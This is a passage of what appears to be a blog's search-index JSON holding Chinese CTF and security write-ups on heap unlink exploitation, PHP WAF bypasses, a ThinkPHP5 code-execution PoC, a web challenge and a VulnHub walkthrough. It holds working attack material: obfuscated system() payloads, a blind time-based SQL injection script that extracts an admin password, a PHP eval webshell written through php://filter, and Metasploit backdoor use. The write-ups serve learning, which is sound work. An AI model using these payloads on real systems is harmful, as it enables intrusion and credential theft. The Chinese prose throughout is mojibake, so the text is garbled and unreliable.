ï¼Œæ‰§è¡Œåˆ°æ£€æµ‹æ—¶å°±ä¼šè§¦å‘ä¸Šé¢çš„æŠ¥é”™ï¼Œå› ä¸ºåœ¨ç¼–è¾‘ chunk1 æ—¶åªèƒ½åœ¨ fd çš„ä½ç½®ä¸Šéšä¾¿å¡«å……ä¸€äº›å­—ç¬¦ï¼ˆæ¯”å¦‚æ˜¯ â€˜aâ€™*8ï¼‰ï¼Œé‚£ä¹ˆå½“ unlink chunk1 çš„æ—¶å€™è·å–åˆ°çš„ fd å°±æ˜¯ 0x6161616161616161 ï¼Œæ‰€ä»¥ fd-&gt;bk è‡ªç„¶å°±ä¼šå´©äº†ã€‚ å…ˆç›´æ¥è¯´æ€ä¹ˆç»•è¿‡ï¼ˆå¦‚æœä¸ç†è§£å…ˆä¸ç”¨æƒ³ä¸ºä»€ä¹ˆï¼‰ï¼Œæ­¤å¤„å‡è®¾ ptr çš„ä½ç½®å¤„å­˜æ”¾ç€ chunk1 çš„åœ°å€ï¼ˆæ³¨æ„è¿™ä¸ªåœ°å€æ˜¯ä» fd å¼€å§‹çš„ã€‚ï¼‰ï¼š ç¼–è¾‘ chunk1 æ—¶ï¼Œå‰ 4ä¸ª 8 ä½ï¼ˆ64ä½ç¨‹åºï¼‰ï¼Œåˆ†åˆ«æ˜¯ï¼š0x0,0x81,&amp;ptr-24,&amp;ptr-16 æ¥ç€ç¬¬ä¸€æ¡ï¼Œåœ¨ç¼–è¾‘åˆ° chunk2 çš„ prev_size æ—¶å¡« 0x80ï¼Œsize å¤„ä¸º 0x90ã€‚ è°ƒç”¨ delete_name åˆ é™¤ chunk2 è¿™æ ·æ˜¯ä¸ä¼šæŠ¥é”™çš„ã€‚è¯´è¯´ä¸ºä»€ä¹ˆï¼š delete_name chunk2 ï¼Œé¦–å…ˆæ£€æµ‹åˆ° size çš„ in_use ä½ä¸º 0ã€‚å°è¯•åˆå¹¶ä¸Šä¸€ä¸ªå— è·å–ä¸Šä¸€ä¸ªå—çš„æ“ä½œå°±æ˜¯ï¼šchunk2 - chunk2_prev_size = chunk2-0x80ã€‚ ä½†æ˜¯ chunk1 çš„å¤§å°æ˜¯ 0x90ï¼Œæ‰€ä»¥ 0x80 æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿå°±æ˜¯ chunk1 çš„ fd çš„ä½ç½®ã€‚æ­¤å¤„çš„ä½ç½®å·²ç»è¢«æˆ‘ä»¬ä¼ªé€ æˆäº†ä¸€ä¸ªå‡çš„ chunk äº†ï¼Œè¿™ä¸ªå‡ chunk æ­¤æ—¶è¿™ä¸ªå‡chunkå¤§æ¦‚é•¿æˆè¿™æ ·ï¼š å‰é¢è¯´è¿‡ ptr è¿™ä¸ªä½ç½®å­˜å‚¨ç€ chunk1 çš„åœ°å€ï¼Œä½†æ˜¯è¿™ä¸ªåœ°å€è‚¯å®šæ˜¯ä» chunk1-&gt;fd å¼€å§‹çš„ï¼Œå› ä¸ºæ˜¯ malloc å‡ºæ¥çš„å—ã€‚å½“ unlink è¿™ä¸ª chunk çš„æ—¶å€™ï¼Œfd-&gt;bkï¼Œå› ä¸ºæ˜¯ 64 ä½ç¨‹åºï¼Œç„¶å bk åœ¨ chunk çš„ç¬¬å››ä½ï¼Œæ‰€ä»¥æ˜¯ ptr-24+24 ï¼Œè¿™æ—¶å€™åˆæŒ‡å‘äº† ptrï¼Œæ­¤å¤„ bk-&gt;fd ä¹Ÿæ˜¯åŒç†ï¼Œäºæ˜¯ä¾¿ç»•è¿‡äº†é‚£å¥æ£€æµ‹ã€‚ é‚£ä¹ˆé‚£ä¹ˆé‚£ä¹ˆã€‚ã€‚ã€‚unlink ä¹‹åæœ‰ä»€ä¹ˆç”¨å‘¢ï¼Ÿå°±åœ¨æ£€æµ‹çš„ä¸‹é¢å°±æœ‰ä¸¤è¡Œè¯´å‡ºäº†ä»–çš„ç”¨å¤„ ï¼š fd-&gt;bk = bk-&gt;fdï¼Œå› ä¸ºéƒ½æ˜¯æŒ‡å‘ ptr çš„ä½ç½®ã€‚æ‰€ä»¥ç¬¬äºŒå¥ä¼šè¦†ç›–æ‰ç¬¬ä¸€å¥çš„æ“ä½œï¼Œæ‰€ä»¥ç¬¬äºŒå¥åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ ptr = bk-&gt;fd = fd é‚£ fd æ˜¯ä»€ä¹ˆå‘¢ï¼Œçœ‹ä¸Šé¢çš„å›¾ï¼Œå°±çŸ¥é“æ˜¯ ptr-24 å•¦ã€‚ è¿™æ—¶å€™æˆ‘ä»¬çš„ ptr çš„åœ°å€å°±æŒ‡å‘ ptr-24ï¼Œæˆ‘ä»¬ç¼–è¾‘ chunk1 çš„æ—¶å€™ï¼Œä» ptr æ‰¾åˆ°åœ°å€ï¼šptr-24ï¼Œç„¶åç¼–è¾‘ã€‚è¿™æ—¶å€™æˆ‘ä»¬åˆå¯ä»¥ç¼–è¾‘ ptr äº†ï¼Œè¾“å‡ºä¹Ÿæ˜¯è¾“å‡ºçš„ ptr æŒ‡å‘çš„ä½ç½®ã€‚æ‰€ä»¥æˆ‘ä»¬å°±æœ‰ä¸ªä»»æ„è¯»å†™å•¦ã€‚ã€‚ã€‚ okokï¼Œå°±å†™è¿™ä¹ˆå¤šäº†ã€‚ã€‚å¤§æ¦‚æ€è·¯å°±è¿™æ · ä¸Šé¢å°±æœ‰ exp çš„æ–‡ä»¶å•¦ã€‚ æ€»ç»“è¿™é“é¢˜è¿˜æ˜¯å¾ˆç®€å•çš„ã€‚ã€‚ã€‚è¿˜æ˜¯å¤ªèœäº†ã€‚ã€‚ã€‚ è¿™tm å“ªæ˜¯æ‰«å°˜å•Šï¼Œè¿™éƒ½å¿«æ‰«éª¨ç°äº†ã€‚","path":"2019/02/20/unlink çš„åˆçº§ç”¨æ³•/","date":"02-20","excerpt":""},{"title":"PHP ä¸­ç»•è¿‡çš„å° TIPS","text":"æ¥è‡ªä¸€ç¯‡å¾ˆæœ‰æ„æ€çš„æ–‡ç« ï¼šHow To Exploit PHP Remotely To Bypass Filters &amp; WAF Rules æ‰«ä¸€ä¸‹å°˜ã€‚ã€‚233 é¦–å…ˆæ¥ä¸€æ®µç®€æ˜“ WAFï¼š1234567&lt;?phpif(preg_match(&quot;/system/i&quot;,$_GET[&apos;code&apos;]))&#123; echo &quot;invalid syntax&quot;;&#125;else&#123; eval($_GET[&apos;code&apos;]);&#125;?&gt; å½“ç„¶æˆ‘çŸ¥é“ï¼Œè¿˜æœ‰åˆ«çš„æ–¹æ³•æ‰§è¡Œå‘½ä»¤ï¼Œè¿™é‡Œè®¨è®ºå¦‚ä½•ç»•è¿‡ systemã€‚ æˆ‘ä»¬çŸ¥é“ï¼ˆæˆ–è®¸ä½ åˆšåˆšæ‰çŸ¥é“çš„ï¼‰ï¼Œåœ¨ php ä¸­å¯ä»¥è¿™ä¹ˆè¡¨è¾¾ä¸€ä¸ªå­—ç¬¦ä¸²ï¼š 12345&lt;?php$a = &quot;\\x61&quot;;$b = &quot;\\141&quot;;$c = &quot;\\u&#123;0061&#125;&quot;; // è¿™é‡Œä¸ª &#123;&#125;?&gt; ä»¥ä¸Šä¸‰ä¸ªéƒ½èƒ½è¡¨ç¤º a è¿™ä¸ªå­—ç¬¦ã€‚æ‰€ä»¥åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥è¿™ä¹ˆç»•è¿‡ï¼šsystem = \\x73\\x79\\x73\\x74\\x65\\x6d(è¿™é‡Œè½¬) äºæ˜¯æˆ‘ä»¬å°±å¯ä»¥æäº¤ï¼šcode = &quot;\\x73\\x79\\x73\\x74\\x65\\x6d&quot;(&#39;whoami&#39;); ç„¶åæˆ‘ä»¬å‡çº§ä¸€ä¸‹ï¼š(preg_match(&quot;/system|\\&quot;|&#39;/i&quot;,$_GET[&#39;code&#39;])) è¿™æ¬¡æˆ‘ä»¬è¿‡æ»¤äº†å•åŒå¼•å·ï¼Œæˆ‘ä»¬ä¸Šä¸€ä¸ª payload åœ¨è¿™é‡Œå°±è¡Œä¸é€šäº†ã€‚ ä½†æ˜¯æˆ‘ä»¬åˆçŸ¥é“ï¼Œåœ¨ PHP ä¸­è¿˜å¯ä»¥è¿™ä¹ˆè¡¨ç¤ºå­—ç¬¦ä¸²ï¼š12$a = (a);$b = (string)a; å½“ç„¶ï¼Œç›®å‰æˆ‘ä»¬è¿˜æ˜¯ä¸èƒ½æ‰§è¡Œ systemï¼Œæˆ‘ä»¬å¯ä»¥ç”¨ä¸€ä¸‹ php ä¸­çš„å­—ç¬¦ä¸²è¿æ¥ç¬¦ï¼ˆ.ï¼‰ï¼š (sy.(s).tem) äºæ˜¯æˆ‘ä»¬çš„ç¬¬ä¸€ä¸ª payload è¯ç”Ÿäº†ï¼š(sy.(s).tem)(whoami); è™½ç„¶ä¼šæœ‰ä¸€äº›æŠ¥é”™ï¼Œä½†å¥½åœ¨è¿˜æ˜¯æ‰§è¡Œäº†ã€‚ã€‚ æˆ‘ä»¬æ¢ä¸ªæ€è·¯æ¥ç©ç©ï¼šget_defined_functions è¿™ä¸ªå‡½æ•°æ‰§è¡Œä¸€ä¸‹å°±çŸ¥é“äº†ã€‚ä¼šè¿”å› php ä¸­å·²ç»å®šä¹‰äº†å¾—å‡½æ•°ï¼ŒåŒ…æ‹¬å†…éƒ¨çš„ã€‚è‡ªç„¶ï¼Œä¹Ÿæœ‰ systemã€‚ è¿™æ˜¯ä¸ªäºŒç»´æ•°ç»„ï¼Œå†…éƒ¨å‡½æ•°åœ¨ internal è¿™ä¸ªæ•°ç»„ä¸­ã€‚æˆ‘æ‰§è¡Œäº†ä¸€ä¸‹ï¼Œsystem åœ¨æˆ‘è¿™å¾—ä¸‹æ ‡æ˜¯ 355ã€‚äºæ˜¯ç¬¬ä¸‰ä¸ª payload å¦‚ä¸‹ï¼š (get_defined_functions()[internal][355])(whoami); å½“ç„¶è¿˜æœ‰ä¸ªæ›´ç®€å•çš„ï¼š ?a=system&amp;code=$_GET[a](whoami); æ­¤å¤–æˆ‘ä»¬è¿˜å¯ä»¥åˆ©ç”¨ç±»ä¼¼ï¼š file_get_contents(substr(__FILE__,0,-19)); ç„¶åå† substr è·å–é‡Œé¢çš„å†…å®¹æ¥æ‹¼æ¥ã€‚ã€‚è¿™é‡Œçš„ __FILE__ ä¼šå¤šå‡ºæ¥ä¸€äº›å­—ç¬¦ï¼Œæ‰€ä»¥ç”¨ substr æˆªæ–­ä¸€ä¸‹ã€‚ å½“ç„¶åˆ°è¿™é‡Œæˆ‘å·²ç»ä¸çŸ¥é“æœ‰ä»€ä¹ˆç”¨äº†ã€‚ã€‚ä½†è§‰å¾—æœ‰æ„æ€å°±å†™ä¸‹æ¥äº†ã€‚ã€‚å½“ä½œæ‰«æ‰«ç°å§ã€‚ã€‚ã€‚","path":"2018/12/30/PHP ä¸­ç»•è¿‡çš„å° TIPS/","date":"12-30","excerpt":""},{"title":"Thinkphp5 çš„ä»»æ„ä»£ç æ‰§è¡Œ","text":"ç²—ç³™çš„åˆ†æäº†ä¸€ä¸‹ã€‚ã€‚2333 é¦–å…ˆçœ‹çœ‹æˆ‘ä»¬çš„ poc ï¼š ?s=index/think\\app/invokefunction ç„¶ååœ¨ library\\App.php çš„ run å‡½æ•°ä¸­ï¼š é‚£ä¹ˆ dispatch æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿ ç”±äºæˆ‘æ²¡æœ‰ debug æ’ä»¶ï¼Œæ‰€ä»¥ç”¨æˆ‘æœ€çˆ±çš„ print_rï¼Œè¿™é‡Œæˆ‘ç”¨äº† laysnsï¼ˆåˆ«é—®ï¼Œéšä¾¿æŒ‘çš„ï¼‰ï¼šå‘ç°åœ¨æ­¤æ—¶ dispatch æ˜¯ç©ºçš„ä¸”ä¸å‚æ•°æ— å…³ï¼Œé‚£ä¹ˆå°±å¿…ç„¶è¿›å…¥ï¼šif(empty($dispatch))æ­¤æ—¶çš„ $request æ˜¯ ThinkPHP çš„ request å¯¹è±¡ï¼š é‚£æˆ‘ä»¬è·Ÿå…¥ routeCheckï¼š é¦–å…ˆ path æ˜¯è·å– å‚æ•° s çš„å€¼: æ¥ä¸‹æ¥ä¼¼ä¹åˆ¤æ–­äº†ï¼Œæ˜¯å¦éœ€è¦æ£€æµ‹è·¯ç”±ã€‚ æ˜¯å¦éƒ½æ— æ‰€è°“ï¼Œå› ä¸ºæˆ‘ä»¬ä¼ çš„ä¸€èˆ¬ä¸åœ¨è·¯ç”±è§„åˆ™é‡Œï¼Œå†æ¥ä¸‹æ¥ï¼š åˆ¤æ–­æ˜¯å¦éœ€è¦å¼ºåˆ¶è·¯ç”±ï¼Œå¦‚æœå¼€å¯äº†å¼ºåˆ¶è·¯ç”±ï¼Œé‚£ä¹ˆå°±ä¼šå¼‚å¸¸é€€å‡ºã€‚è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆæ¼æ´æè¿°è¯´ï¼šåœ¨å…³é—­å¼ºåˆ¶è·¯ç”±çš„æƒ…å†µä¸‹ã€‚ ç„¶åå°±åˆ°äº†ï¼š è¿™é‡Œäº†ï¼Œå¦‚æœæˆ‘ä»¬è·¯ç”±æ²¡åŒ¹é…åˆ°ï¼Œæ­¤å¤„æˆ‘ä»¬å°±çš„ $result å°±è¿˜æ˜¯ç©ºï¼Œæ­¤æ—¶å°±ä¼šè¿›å…¥ parseUrl å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°å°±ä¸è¿‡å¤šåˆ†æäº†ï¼Œå°±æ˜¯æ‹†åˆ† $pathï¼ˆå…¶å®æ˜¯å‹æ ¹æ²¡çœ‹ã€‚233ï¼‰ çœ‹çœ‹æ­¤å¤„çš„è¾“å‡ºå°±å¾ˆæ˜äº†äº†ï¼š æ•°ç»„ç¬¬ä¸€ä¸ªæ˜¯æ§åˆ¶å™¨ï¼Œç¬¬äºŒä¸ªæ˜¯ç±»ï¼Œç¬¬ä¸‰ä¸ªæ˜¯æ–¹æ³• å¯ä»¥çœ‹åˆ°å·²ç»æ‹†åˆ†æˆè¿™æ ·äº†ï¼Œç„¶åè¿”å›ï¼š ç„¶åå°±ä¸€è·¯æ‰§è¡Œåˆ° self:exec å¤„ã€‚æ­¤æ—¶å°±æ‰§è¡Œäº† payload æŒ‡å®šçš„ç±»ï¼š think\\app ä¸­çš„æ–¹æ³•ï¼šinvokefunctionã€‚ æ²¡é”™ï¼Œä½†æ˜¯è¿™ä¸ªæ–‡ä»¶ï¼š è¿™é‡Œç”¨äº†åå°„ï¼Œæˆ‘ä¸æ˜¯ç‰¹åˆ«æ˜ç™½ã€‚ã€‚åæ­£èƒ½æ‰§è¡Œå°±å¯¹äº†ã€‚233 endã€‚ã€‚ã€‚ã€‚ï¼ˆè¯´å®è¯è¿™ç§æ´æ”¾æˆ‘æˆ‘è¿˜çœŸçœ‹ä¸å‡ºæ¥ã€‚ã€‚ã€‚ï¼‰","path":"2018/12/17/Thinkphp5 çš„ä»»æ„ä»£ç æ‰§è¡Œ/","date":"12-17","excerpt":""},{"title":"è®°ä¸€é“ web é¢˜","text":"åŸæ–‡ï¼šhttps://www.anquanke.com/post/id/167637 è¿™é“é¢˜ä¸ç®—éš¾å§ã€‚ã€‚ï¼ˆè™½ç„¶çœ‹äº† WPã€‚ã€‚ã€‚ï¼‰ æºç å¤ªé•¿äº†ï¼Œä¸è´´äº†ã€‚åŸé¢˜é‡Œæœ‰ã€‚ã€‚è´´ä¸€ä¸‹æ•°æ®åº“çš„ä»£ç å§ï¼š1234567891011121314create database web500 charset=utf8;use web500;create table user( id int key auto_increment, user varchar(100), pass varchar(100));create table note( id int key auto_increment, user varchar(100), title varchar(100), content varchar(100));insert user values(1,&quot;admin&quot;,&quot;admin123&quot;); é¦–å…ˆå¤§è‡´çš„çœ‹çœ‹å‡ ä¸ªå‡½æ•°ï¼š å¯ä»¥å‘ç°è¿™é‡ŒæŸ¥è¯¢çš„æ—¶å€™éƒ½æŠŠ $user è½¬æˆ hex äº†ã€‚ butã€‚ã€‚ã€‚ æ˜¯çš„ï¼Œè¿™é‡Œæ²¡æœ‰ tohexã€‚æˆ‘ä»¬å¯ä»¥çœ‹çœ‹è¿™ä¸ª $user æ˜¯å“ªé‡Œæ¥çš„ï¼š å¯ä»¥çœ‹åˆ°è¿™é‡Œ æ˜¯ä» session è·å–çš„ï¼Œé‚£ä¹ˆ seesion ä¸­çš„ user æ˜¯æ€ä¹ˆæ¥çš„å‘¢ï¼Ÿ è¿™é‡Œè¿˜æ³¨å†Œäº†ä¸ª $admin å˜é‡ã€‚è®°å½•ç™»é™†çš„ç”¨æˆ·æ˜¯å¦ä¸º admin ç™»é™†æˆåŠŸåï¼Œä» $_POST[&#39;user&#39;] ä¸­æå–çš„ã€‚ åˆ©ç”¨æµç¨‹ï¼šæ³¨å†Œä¸€ä¸ªç”¨æˆ· -&gt; ç™»é™† -&gt; æ·»åŠ note -&gt; åˆ é™¤noteã€‚ å“¦~è‡³äºä¸ºä»€ä¹ˆè¦ admin çš„å¯†ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹ï¼š æœ€å¼€å§‹åˆ¤æ–­äº†æ˜¯å¦ä¸º adminã€‚ è¿™é‡Œå¥½åƒèƒ½å†™ shellï¼Œä½†æ˜¯æ­¤å¤„é™åˆ¶äº†æ–‡ä»¶åçš„åç¼€ ï¼Œæ€ä¹ˆç»•è¿‡è¿™ä¸ª preg_match å‘¢ï¼Ÿ æ­¤å¤„æ­£åˆ™ï¼š.+\\.ph(p[3457]?|t|tml)$ å¯ä»¥å‘ç°æ­£åˆ™æœ€åæœ‰ä¸ª $ï¼Œå³ï¼šphp/pht/pht è¿™æ ·çš„åç¼€æ‰ä¼šè¢«åŒ¹é…ï¼Œè¯´ç™½äº†å°±æ˜¯æœ€åä¸èƒ½æ˜¯ php/pht/phtml/ph2/3/4/5 è¿™æ ·ï¼Œä½†æ˜¯ phpa/phtb è¿™æ ·çš„åç¼€æ­£åˆ™è¡¨è¾¾å¼å°±åŒ¹é…ä¸åˆ°äº†ã€‚ã€‚ã€‚ã€‚ é‚£ä¹ˆæˆ‘ä»¬çš„åç¼€å¯ä»¥è¿™æ ·ï¼š php/. ï¼Œå› ä¸º / æ˜¯è·¯å¾„åˆ†éš”ç¬¦ï¼ˆå§ï¼Ÿï¼‰ï¼Œæ‰€ä»¥åˆ›å»º abc.php/. ç›¸å½“äºå†™å…¥ abc.phpã€‚ æ³¨å…¥okã€‚å›åˆ°å‰é¢ï¼Œæˆ‘ä»¬å‘ç°å¯ä»¥æ³¨å…¥ï¼Œæˆ‘ä»¬æ­¤æ—¶è¯•è¯•æ³¨å…¥å¤„ admin çš„å¯†ç ï¼Œæ‰‹åŠ¨å‡ ä¹ä¸å¯èƒ½çš„ï¼Œæˆ‘ä»¬è€ƒè™‘ç”¨ç”¨è„šæœ¬å§ ä½†æ˜¯ä¸ç®¡ç™»é™†æ³¨å†Œæˆ‘ä»¬éƒ½ä¼šå‘ç°æœ‰ä¸ªè¿™ä¸ªï¼Œè¿™ä¸ªæ˜¯åˆ¤æ–­éªŒè¯ç æ˜¯å¦æ­£ç¡®ã€‚ã€‚ ä¸”è¿™é‡Œä¸èƒ½ä¸€ä¸ªéªŒè¯ç å¤šæ¬¡ä½¿ç”¨ã€‚ã€‚ã€‚ ä½†æ˜¯ã€‚ã€‚ã€‚ã€‚è¿™é‡Œå¹¶æ²¡æœ‰åˆ¤æ–­ $_SESSION[&#39;answer&#39;] æ˜¯å¦ä¸ºç©ºã€‚ è€Œç”ŸæˆéªŒè¯ç çš„æ˜¯ä¸€æ®µ html ï¼š&lt;img src=&quot;valicode.php&quot;&gt; å½“æˆ‘ä»¬ç›´æ¥è¯·æ±‚ register æ—¶ä¼šå…ˆè§£é‡Š php ä»£ç ã€‚å¦‚æœæ­¤æ—¶ answer è¿˜æ²¡ç”Ÿæˆï¼Œé‚£ä¹ˆå½“æˆ‘ä»¬ä¼ å…¥çš„ code ä¸º ç©ºæ—¶ï¼š&#39;&#39;==NULL æˆç«‹ã€‚ é‚£æ€ä¹ˆè®©ä»–ç”Ÿæˆä¹‹å‰è¯·æ±‚ register å‘¢ï¼Ÿæ­¤å¤„åªéœ€è¦æŠŠ SESSION åˆ äº†ï¼Œå³å¯ã€‚ äºæ˜¯å†™ä¸ªjoæœ¬ï¼š 1234567891011121314151617181920212223242526272829303132333435import requestsimport timedef register(user,passwd): url=&quot;http://192.168.0.109/ctf/web500/test.php?action=register&quot; requests.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;) passdef login(user,passwd): s = requests.session() url=&quot;http://192.168.0.109/ctf/web500/test.php?action=login&quot; s.post(url,data=&#123;&quot;user&quot;:user,&quot;pass&quot;:passwd,&quot;code&quot;:&quot;&quot;&#125;) return s passdef delete_note(s): url = &quot;http://192.168.0.109/ctf/web500/test.php?action=delete&amp;id=4&quot; s.get(url) passpayload = &quot;11&apos; or if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&quot;admin_pass = &quot;&quot;for i in range(1,100): print &quot;admin_pass : &quot;,admin_pass for a in &apos;abcdefghijklmnopqrstuvwxyz1234567890&apos;: payload_tmp = payload.format(offset=i,asc=a) register(payload_tmp,&apos;1234&apos;) s = login(payload_tmp,&apos;1234&apos;) t1 = time.time() delete_note(s) t2 = time.time() if t2-t1&gt;3: admin_pass+=a break; æˆ‘ä¸€å¼€å§‹è¿˜ç¢°åˆ°äº†äº›é—®é¢˜ï¼Œï¼Œå¥½åƒæ˜¯ and å’Œ or çš„é—®é¢˜ï¼š1if(mid((select pass from user where user=&apos;admin&apos;),&#123;offset&#125;,1)=&apos;&#123;asc&#125;&apos;,sleep(5),0)=1 or 1=&apos;&apos; å¦‚æœæœ€åçš„ or 1=&#39;&#39; æ˜¯ and 1=&#39;&#39; çš„è¯ï¼Œå¥½åƒå°±ä¸è¡Œã€‚ åŒæ ·çš„å¯ä»¥å‚è€ƒï¼š12345select * from user where 1=(sleep(10)) and 1=&apos;&apos;; # ä¸è§¦å‘ sleepselect * from user where 1=(sleep(10)) and 1=1; # è§¦å‘ sleepselect * from user where 1=1 and 1=(sleep(10)); # è§¦å‘ sleepselect * from user where 1=&apos;&apos; and 1=(sleep(10)); # ä¸è§¦å‘ sleepselect * from user where 1=(sleep(3)) and 1=(sleep(10)); # ä¸€ç›´ç¡ä¸‹å»ã€‚ã€‚ã€‚ çŒœæµ‹å¯èƒ½æ˜¯ å¦‚æœ where å­å¥ä¸­æœ‰ and å…ˆåˆ¤æ–­äº†è€—æ—¶æ¯”è¾ƒçŸ­çš„ï¼Œå¦‚æœè€—æ—¶çŸ­çš„éƒ½ä¸è¡Œé‚£å°±æ²¡å¿…è¦åˆ¤æ–­è€—æ—¶é•¿çš„äº† ä»¥ä¸Šæ˜¯ççŒœçš„ã€‚ã€‚åæ­£ç”¨ or å°±å¯¹äº†ã€‚ã€‚233 ä½†æ˜¯å¥½åƒæœ‰ä¸€äº›é—®é¢˜ã€‚ã€‚ã€‚ä¼šå¤šè·‘å‡ºå‡ ä¸ªå­—ç¬¦ã€‚ã€‚ã€‚mdç®—äº†ã€‚ã€‚ è·‘å‡ºå¯†ç åå°±å¯ä»¥ç™»é™†äº†ï¼Œæ­¤æ—¶ä½¿ç”¨ backup åŠŸèƒ½ã€‚ å‘ç° php/. çš„åç¼€ç¡®å®å¯ä»¥ä¿å­˜æˆ php åç¼€çš„æ–‡ä»¶åï¼Œï¼Œä½†æ˜¯ï¼š å½“æˆ‘ä»¬æ‰§è¡Œ newnote æ·»åŠ ä¸€ä¸ª &lt;?php eval($_REQUEST[1])?&gt; çš„æ—¶å€™ï¼š è¿™é‡Œä½¿ç”¨äº† htmlspecialcharsï¼š äºæ˜¯ä¾¿ä¸èƒ½ç›´æ¥å†™ä¸€å¥è¯äº†ã€‚ è¿™æ—¶å€™ï¼š å‚è€ƒä¸‹pç¥çš„æ–‡ç« :è°ˆä¸€è°ˆphp://filterçš„å¦™ç”¨ å¾—çŸ¥æˆ‘ä»¬å¯ä»¥åœ¨ æ–‡ä»¶æ“ä½œçš„åœ°æ–¹ä½¿ç”¨ php://filter ä¼ªåè®® æˆ‘ä»¬å¯ä»¥ add_note çš„æ—¶å€™æ·»åŠ ï¼šbase64_encode(&#39;&lt;?php eval($_REQUEST[1])?&gt;&#39;)è¿™ä¸ªçš„ç»“æœï¼šPD9waHAgZXZhbCgkX1JFUVVFU1RbMV0pPz4 æ­¤æ—¶è°ƒç”¨ backupï¼Œæ–‡ä»¶åå†™ï¼šphp://filter/convert.base64-decode/resource=test.php/. æ³¨æ„è¿™é‡Œæ˜¯ base64-decodeã€‚ã€‚ã€‚ è‡³æ­¤å°±å·²ç»æ‹¿åˆ° shell äº†ã€‚ã€‚ æ€»ç»“è¿™é¢˜ä½¿ç”¨åˆ°çš„ trick : äºŒæ¬¡æ³¨å…¥ åˆ é™¤ SESSION çš„æ–¹å¼ç»•è¿‡éªŒè¯ç  æ“ä½œæ–‡ä»¶æ—¶ä½¿ç”¨ php://filter ä¼ªåè®®ã€‚ã€‚","path":"2018/12/16/è®°ä¸€é“ web é¢˜/","date":"12-16","excerpt":""},{"title":"VulnHub JIS-CTF","text":"è¯´å®è¯çœŸçš„å¾ˆä¸¢äººï¼Œè¿™é“é¢˜çœŸçš„å¾ˆç®€å•ã€‚ã€‚ä¸€å¼€å§‹æŒ‘è¿™é“é¢˜æ˜¯å› ä¸ºè¿™é“é¢˜ç™¾åº¦æœ‰ WPã€‚ã€‚ã€‚å”‰~ WP é€‰æ‰‹ã€‚ é¢˜ç›®åœ°å€ ä¸€å¼€å§‹ä¸€ä¸ªç™»é™†ç•Œé¢ï¼Œä¸çŸ¥é“æ€ä¹ˆåšï¼Ÿå½“ç„¶æ˜¯æ‰«ç›®å½•å•Šã€‚ æ‰«åˆ°ä¸ª robots.txt [ä¸æƒ³æˆªå›¾] è®¿é—®ï¼š çœ‹åˆ°ä¸€äº›ï¼Œä½†æ˜¯å¹¶ä¸æ˜¯å…¨éƒ¨éƒ½èƒ½è®¿é—®ï¼Œä¸€ä¸ªä¸€ä¸ªè®¿é—®å§ï¼š admin_area é‡Œé¢æœ‰ ç¬¬äºŒä¸ª flag ç¬¬ä¸€ä¸ª flag åœ¨ /flag é‡Œ ç„¶ååˆ©ç”¨ admin_area è·å–åˆ°çš„ç”¨æˆ·åå¯†ç ç™»é™†ï¼Œå‘ç°æœ‰ä¸ªä¸Šä¼ ã€‚ç„¶åä»»æ„ä¸Šä¼ ï¼Œèœåˆ€è¿æ¥ã€‚ã€‚ã€‚ç›®å½•çš„è¯åœ¨ robots.txt é‡Œæœ‰çš„ï¼Œæ˜¯é‚£ä¸ª uploaded_files æˆ‘ç”¨çš„æ˜¯ metasploit äº†ï¼Œå› ä¸ºæˆ‘èœåˆ€è¿ä¸ä¸Šã€‚ã€‚ç”¨çš„ multi/http/caidao_php_backdoor_exec è¿™ä¸ªæ¨¡å—ã€‚ã€‚è®¾ç½®å¥½å°±è¡Œäº†ã€‚ã€‚ è¿›å…¥ meterpreter ä¹‹åè¿›å…¥ shellï¼Œmeterpreter å¥½åƒçœ‹ä¸åˆ°æ–‡ä»¶çš„æ‰€å±ç”¨æˆ·å’Œç»„ è¿™é‡Œçœ‹åˆ° flag.txt æ˜¯è¯»å–ä¸äº†çš„ï¼Œæ‰€ä»¥è¯»å– hint çœ‹çœ‹ï¼Œç„¶åè¿™é‡Œå°±æœ‰äº†ç¬¬ä¸‰ä¸ª flag äº† æç¤ºè¯´æ‹¿åˆ° technawi çš„å¯†ç ï¼Œè¿™é‡Œæ˜¯æˆ‘çœ‹ wp çš„åœ°æ–¹ã€‚ã€‚åŸå› æ˜¯æˆ‘ç¡®å®ä¸çŸ¥é“æ€ä¹ˆæ‰¾ã€‚ã€‚ ä½¿ç”¨å‘½ä»¤ï¼š grep -rs technawi / æœç´¢ / å¯å¤ªæ…¢äº†ï¼Œå‰§é€ç›´æ¥æœç´¢ /etc/ ç„¶åæ‰“å¼€è¿™ä¸ªï¼š ç¬¬å››ä¸ª flag å’Œ technawi çš„å¯†ç  ç„¶åå°±æ˜¯ ssh è¿œç¨‹è¿æ¥ã€‚ã€‚æ‰“å¼€åˆšåˆšé‚£ä¸ª flag.txt ï¼š è¿™é‡Œå°±ç»“æŸäº†ï¼Œï¼Œbutï¼Œä½ æœ‰æ²¡æœ‰å‘ç°çš„ç”¨æˆ·æ˜¯ rootï¼Œæ²¡é”™ï¼Œåœ¨æˆ‘æ‹¿åˆ° flag5 å‰æˆ‘è¿˜æ³¨æ„åˆ°äº† technawi ç›®å½•ä¸‹æœ‰ä¸ª .sudo_as_admin_successful è¿™ä¸ªæ–‡ä»¶ï¼Œæˆ‘åœ¨æƒ³ä¼šä¸ä¼šæ˜¯å¯ä»¥ sudo å‘¢ï¼Ÿ äºæ˜¯æˆ‘ sudo rootã€‚å‘ç°æœçœŸå¯ä»¥ã€‚ã€‚çœ‹çœ‹ /etc/sudoers æ–‡ä»¶ï¼š çœ‹ï¼Œtechnawi æ˜¯ sudo ç»„çš„ã€‚ é‚£ä¹ˆé‚£ä¸ªæ–‡ä»¶æ˜¯å¹²å˜›çš„å‘¢ï¼Ÿï¼Ÿæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œï¼Œ å¯ä»¥çœ‹çœ‹è¿™é‡Œ åæ­£æ¯æ¬¡ sudo éƒ½ä¼šäº§ç”Ÿã€‚ã€‚ å…³äº sudoers 